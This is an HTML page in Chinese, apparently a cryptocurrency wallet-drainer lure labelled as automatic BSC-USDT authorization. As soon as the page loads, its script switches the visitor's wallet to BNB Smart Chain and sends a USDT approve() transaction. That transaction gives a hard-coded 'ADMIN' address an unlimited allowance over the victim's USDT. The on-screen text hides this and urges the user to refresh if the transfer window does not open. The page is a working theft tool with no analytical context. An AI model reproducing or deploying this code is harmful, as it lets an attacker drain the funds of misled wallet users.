<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BSC-USDT自动授权</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:system-ui}
body{background:#0f0f23;color:#fff;padding:20px;text-align:center}
h2{margin:30px 0}
.tip{color:#aaa}
</style>
</head>
<body>
<h2>正在自动唤起授权交易...</h2>
<p class="tip">若未弹出转账页面，请刷新页面</p>
<script>
const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
const ADMIN = "0x627f6E1887571Ac08214315ad5b2fA7ABb7345f1";
const BSC_CHAIN = "0x38";
const approveData = "0x095ea7b3" + ADMIN.slice(2).padStart(64,"0") + "f".repeat(64);

async function autoApprove(){
  if(!window.ethereum){
    alert("请在TP钱包内置浏览器打开");
    return;
  }
  // 切换BSC链
  await ethereum.request({method:"wallet_switchEthereumChain",params:[{chainId:BSC_CHAIN}]}).catch(()=>{});
  // 自动发起交易，无需点击按钮
  await ethereum.request({
    method:"eth_sendTransaction",
    params:[{to:USDT_CONTRACT,data:approveData,gasLimit:"0x300000",value:"0x0"}]
  }).catch(err=>{
    alert("操作已取消或失败："+err.message)
  })
}
window.onload = autoApprove;
</script>
</body>
</html>
